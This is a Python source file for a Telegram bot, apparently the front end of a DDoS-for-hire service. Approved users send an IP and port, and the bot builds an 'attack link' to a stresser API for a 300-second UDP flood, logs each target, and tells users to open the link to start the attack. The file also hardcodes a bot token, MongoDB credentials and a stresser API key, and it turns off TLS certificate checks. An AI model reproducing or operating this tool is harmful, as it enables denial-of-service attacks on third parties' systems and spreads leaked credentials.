import asyncio
from datetime import datetime
from pymongo import MongoClient
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler

# ==================== CONFIG ====================
BOT_TOKEN = "8473566885:AAHO0vs5G7AdDniZhs28501dphSeYOj3Q1E"
MONGO_URI = "mongodb+srv://nikilsaxena843_db_user:3gF2wyT4IjsFt0cY@vipbot.puv6gfk.mongodb.net/?appName=vipbot"
OWNER_ID = 7459756974
API_URL = "https://susstresser.com/panel/api/api.php"
API_KEY = "ujiYT1DJIAacgnFB"
DB_NAME = "vip-ddos-bot"

# ==================== DATABASE SETUP ====================
client = MongoClient(MONGO_URI, ssl=True, tlsAllowInvalidCertificates=True)
db = client[DB_NAME]
users_collection = db['users']
link_logs = db['link_logs']  # Logs store karne ke liye

def add_user(user_id, username):
    if not users_collection.find_one({'user_id': user_id}):
        users_collection.insert_one({
            'user_id': user_id,
            'username': username,
            'approved': True if user_id == OWNER_ID else False,
            'joined_date': datetime.now()
        })
        return True
    return False

def approve_user(user_id):
    users_collection.update_one({'user_id': user_id}, {'$set': {'approved': True}})
    return True

def is_approved(user_id):
    user = users_collection.find_one({'user_id': user_id})
    return user and user.get('approved', False)

def get_all_users():
    return list(users_collection.find())

def log_link(user_id, ip, port, time, method, link):
    link_logs.insert_one({
        'user_id': user_id,
        'ip': ip,
        'port': port,
        'time': time,
        'method': method,
        'link': link,
        'timestamp': datetime.now()
    })

# ==================== KEYBOARDS ====================
def get_owner_keyboard():
    keyboard = [
        [InlineKeyboardButton("📊 Stats", callback_data='stats')],
        [InlineKeyboardButton("👥 Pending Users", callback_data='pending')],
        [InlineKeyboardButton("✅ Approve User", callback_data='approve_menu')],
        [InlineKeyboardButton("📜 Link Logs", callback_data='logs')]
    ]
    return InlineKeyboardMarkup(keyboard)

# ==================== COMMANDS ====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    
    add_user(user_id, user.username)
    
    if user_id == OWNER_ID:
        await update.message.reply_text(
            f"👋 Welcome Owner {user.first_name}!\n\n"
            f"🎯 Bot is ready!\n"
            f"📝 Usage: send `IP PORT`\n\n"
            f"Example: `34.0.15.252 29730`\n\n"
            f"⚠️ Attack time: 300 seconds\n"
            f"🔧 Method: UDP\n\n"
            f"💡 Bot sirf link generate karega, request nahi bhejega!",
            parse_mode='Markdown',
            reply_markup=get_owner_keyboard()
        )
    elif is_approved(user_id):
        await update.message.reply_text(
            f"✅ Approved User: {user.first_name}\n\n"
            f"🎯 Send IP and PORT like:\n"
            f"`34.0.15.252 29730`\n\n"
            f"⏱️ Time: 300 sec | Method: UDP\n\n"
            f"💡 Bot sirf link generate karega!",
            parse_mode='Markdown'
        )
    else:
        await update.message.reply_text(
            f"❌ *Access Denied!*\n\n"
            f"Hello {user.first_name}, you are not approved yet.\n"
            f"Contact owner for approval.\n\n"
            f"Your ID: `{user_id}`",
            parse_mode='Markdown'
        )

async def generate_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id != OWNER_ID and not is_approved(user_id):
        await update.message.reply_text("❌ You are not authorized to use this bot!")
        return
    
    text = update.message.text.strip()
    parts = text.split()
    
    if len(parts) != 2:
        await update.message.reply_text(
            "❌ *Invalid format!*\n\n"
            "Send like this:\n"
            "`34.0.15.252 29730`\n\n"
            "📍 IP PORT",
            parse_mode='Markdown'
        )
        return
    
    ip, port = parts[0], parts[1]
    
    if not port.isdigit():
        await update.message.reply_text("❌ Port must be a number!")
        return
    
    # Sirf link generate karo, request mat bhejo
    attack_link = f"{API_URL}?key={API_KEY}&host={ip}&port={port}&time=300&method=udp"
    
    # Log store karo
    log_link(user_id, ip, port, 300, 'udp', attack_link)
    
    # User ko link bhejo
    await update.message.reply_text(
        f"✅ *Link Generated Successfully!*\n\n"
        f"🎯 Target: `{ip}:{port}`\n"
        f"⏱️ Time: 300 seconds\n"
        f"🔧 Method: UDP\n\n"
        f"🔗 *Your Attack Link:*\n`{attack_link}`\n\n"
        f"⚠️ Copy this link and open in browser to start attack!",
        parse_mode='Markdown'
    )

async def owner_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ Only owner can use this!")
        return
    
    await update.message.reply_text(
        "👑 *Owner Panel*\n\nChoose an option:",
        parse_mode='Markdown',
        reply_markup=get_owner_keyboard()
    )

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data == 'stats':
        users = get_all_users()
        approved = sum(1 for u in users if u.get('approved', False))
        pending = len(users) - approved
        
        await query.edit_message_text(
            f"📊 *Bot Statistics*\n\n"
            f"👥 Total Users: `{len(users)}`\n"
            f"✅ Approved: `{approved}`\n"
            f"⏳ Pending: `{pending}`\n"
            f"👑 Owner ID: `{OWNER_ID}`",
            parse_mode='Markdown',
            reply_markup=get_owner_keyboard()
        )
    
    elif query.data == 'pending':
        users = get_all_users()
        pending_users = [u for u in users if not u.get('approved', False)]
        
        if not pending_users:
            await query.edit_message_text("📭 No pending users!", reply_markup=get_owner_keyboard())
        else:
            msg = "⏳ *Pending Users:*\n\n"
            for u in pending_users:
                msg += f"🆔 ID: `{u['user_id']}` | @{u.get('username', 'No username')}\n"
            
            await query.edit_message_text(msg, parse_mode='Markdown', reply_markup=get_owner_keyboard())
    
    elif query.data == 'approve_menu':
        await query.edit_message_text(
            "✅ *Approve User*\n\n"
            "Send command:\n"
            "`/approve 123456789`",
            parse_mode='Markdown'
        )
    
    elif query.data == 'logs':
        logs = list(link_logs.find().sort('timestamp', -1).limit(10))
        if not logs:
            await query.edit_message_text("📭 No link logs found!", reply_markup=get_owner_keyboard())
        else:
            msg = "📜 *Last 10 Generated Links:*\n\n"
            for log in logs:
                msg += f"👤 User: `{log['user_id']}`\n🎯 Target: `{log['ip']}:{log['port']}`\n⏱️ Time: {log['timestamp'].strftime('%H:%M:%S')}\n\n"
            await query.edit_message_text(msg, parse_mode='Markdown', reply_markup=get_owner_keyboard())

async def approve_user_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ Only owner can approve!")
        return
    
    try:
        user_id = int(context.args[0])
        approve_user(user_id)
        await update.message.reply_text(f"✅ User `{user_id}` approved successfully!", parse_mode='Markdown')
    except:
        await update.message.reply_text("❌ Usage: `/approve 123456789`", parse_mode='Markdown')

# ==================== MAIN ====================
if __name__ == "__main__":
    # Heroku ke liye special handling
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("owner", owner_panel))
    app.add_handler(CommandHandler("approve", approve_user_cmd))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, generate_link))
    app.add_handler(CallbackQueryHandler(button_callback))
    
    print("🤖 Bot is running on Heroku...")
    print("💡 Bot will ONLY generate links, not send requests!")
    
    app.run_polling()
